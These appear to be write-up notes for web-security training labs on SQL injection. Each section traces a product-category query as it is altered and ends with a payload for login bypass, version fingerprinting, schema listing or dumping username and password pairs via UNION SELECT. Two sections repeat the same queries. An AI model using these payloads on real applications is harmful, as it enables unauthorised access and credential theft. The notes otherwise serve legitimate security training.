## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```

> Payload: `' OR 1=1 --`

## SQL injection vulnerability allowing login bypass

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'SuperP@ssword'
SELECT * FROM users WHERE username = 'administrator' --' AND password = 'SuperP@ssword'
```

> Payload : `administrator' --`

## SQL injection UNION attack, determining the number of columns returned by the query

```sql
SELECT * FROM products WHERE category = 'Gifts'
SELECT * FROM products WHERE category = 'Gifts' --'
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 4--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL--'
```

> Payload : `' UNION SELECT NULL,NULL,NULL--`

## SQL injection UNION attack, finding a column containing text

```sql
SELECT * FROM products WHERE category = 'Gifts'
SELECT * FROM products WHERE category = 'Gifts'--'
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 4--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,'YT7kqh',NULL--'
```

> Payload: `' UNION SELECT NULL,'YT7kqh',NULL--`

## SQL injection UNION attack, retrieving data from other tables

```sql
SELECT * FROM products WHERE category = 'Gifts'
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a'--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,version()--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,username||':'||password FROM users--'
```

> Payload : `' UNION SELECT NULL,username||':'||password FROM users--`

## SQL injection UNION attack, retrieving multiple values in a single column

```sql
SELECT * FROM products WHERE category = 'Gifts'
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a'--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,version()--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,username||':'||password FROM users--'
```

> Payload : `' UNION SELECT NULL,username||':'||password FROM users--`

## SQL injection attack, querying the database type and version on Oracle

```sql
SELECT * FROM products WHERE category = 'Gifts'
SELECT * FROM products WHERE category = 'Gifts' --'
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a' FROM dual --'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, banner FROM v$version --'
```

> Payload : `' UNION SELECT NULL, banner FROM v$version --`

## SQL injection attack, querying the database type and version on MySQL and Microsoft

```sql
SELECT * FROM products WHERE category = 'Gifts'
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3 %23
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a' %23
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,@@version%23
```

> Payload : `' UNION SELECT NULL,@@version%23`

## SQL injection attack, listing the database contents on non-Oracle databases

```sql
SELECT * FROM products WHERE category = 'Gifts'
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a'--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,version()--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, table_name FROM information_schema.tables--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_eusdjy'--'

SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, username_pkzadx||':'||password_ipdxdb FROM users_eusdjy--'
```

> Payload: `' UNION SELECT NULL, username_pkzadx||':'||password_ipdxdb FROM users_eusdjy--`